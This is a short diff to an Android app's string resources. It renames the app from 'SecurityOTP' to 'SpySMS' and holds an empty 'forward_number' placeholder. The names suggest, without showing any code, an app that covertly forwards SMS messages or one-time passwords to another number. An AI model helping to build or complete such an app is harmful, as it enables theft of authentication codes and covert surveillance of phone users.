@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
 
-    <string name="app_name">SecurityOTP</string>
+    <string name="app_name">SpySMS</string>
     <string name="forward_number"> <!-- FORWARD NUMBER -->
     </string>
     <string name="init_text">INIT</string>
